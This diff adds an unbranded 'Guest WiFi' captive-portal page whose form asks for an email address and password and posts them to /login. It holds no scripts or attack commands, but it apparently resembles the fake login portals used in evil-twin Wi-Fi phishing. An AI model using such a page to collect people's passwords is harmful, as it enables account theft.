@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>WiFi Login</title>
+    <style>
+        body { font-family: -apple-system, 'Segoe UI', Roboto, Arial, sans-serif; background: #0b3d69; margin: 0; color: #fff; }
+        .card { max-width: 400px; margin: 7vh auto; background: #fff; color: #1b1b1b; border-radius: 10px; padding: 34px; box-shadow: 0 6px 20px rgba(0,0,0,.3); }
+        .logo { text-align: center; font-size: 40px; margin-bottom: 6px; }
+        h1 { font-size: 21px; font-weight: 600; text-align: center; margin: 4px 0 4px; }
+        p { text-align: center; color: #5f6368; font-size: 14px; margin: 0 0 22px; }
+        input { width: 100%; box-sizing: border-box; padding: 13px; margin: 7px 0; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; }
+        button { width: 100%; margin-top: 16px; padding: 13px; border: 0; border-radius: 6px; background: #0b7bd6; color: #fff; font-size: 15px; font-weight: 600; }
+        .foot { text-align: center; color: #9aa0a6; font-size: 12px; margin-top: 18px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">&#128246;</div>
+        <h1>Guest WiFi</h1>
+        <p>Sign in with your account to get online</p>
+        <form method="POST" action="/login">
+            <input type="email" name="email" placeholder="Email address" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Connect</button>
+        </form>
+        <div class="foot">By connecting you agree to the terms of use.</div>
+    </div>
+</body>
+</html>
